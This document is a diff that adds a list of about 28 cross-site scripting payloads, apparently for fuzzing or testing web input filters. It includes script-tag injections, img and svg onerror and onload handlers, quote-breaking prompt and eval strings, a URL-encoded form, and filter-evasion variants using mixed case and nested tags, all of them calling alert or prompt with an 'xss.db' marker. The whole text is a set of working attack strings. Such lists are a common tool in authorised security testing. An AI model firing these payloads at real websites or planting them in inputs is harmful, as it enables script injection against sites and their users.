@@ -1,0 +1,28 @@
+%3Cscript%3Ealert%28xss.db%29%3C%2Fscript%3E
+";a=prompt,a(xss.db)//
+';a=prompt,a(xss.db)//
+"-eval("window['pro'%2B'mpt'](xss.db)")-"
+'-eval("window['pro'%2B'mpt'](xss.db)")-'
+<image src/onerror=prompt(xss.db)>
+<image/src/onerror=prompt(xss.db)>
+<image src =q onerror=prompt(xss.db)>
+<img src/onerror=prompt(xss.db)>
+<img/src/onerror=prompt(xss.db)>
+<img src =q onerror=prompt(xss.db)>
+"/><img src=x onerror=alert(xss.db)>
+"><img src=x onerror=alert(xss.db)>
+"onclick=prompt(xss.db)><svg/onload=prompt(xss.db)>"@x.y
+"onclick=prompt(xss.db)>"@x.y
+"-prompt(xss.db)-"
+'-prompt(xss.db)-'
+";<script>alert(xss.db)</script>
+"<script>alert(xss.db)</script>
+;<script>alert(xss.db)</script>
+<<script>alert(xss.db)</script>
+<script >alert(xss.db)</script >
+<script>alert('xss.db')</script>
+<script>alert(xss.db)</script>
+`<script>alert(xss.db)</script>`
+<sCript>alert(xss.db)</sCript>
+<scr<script>alert(xss.db)</script>
+<scr<script>ipt>alert(xss.db)</scr<script>ipt>
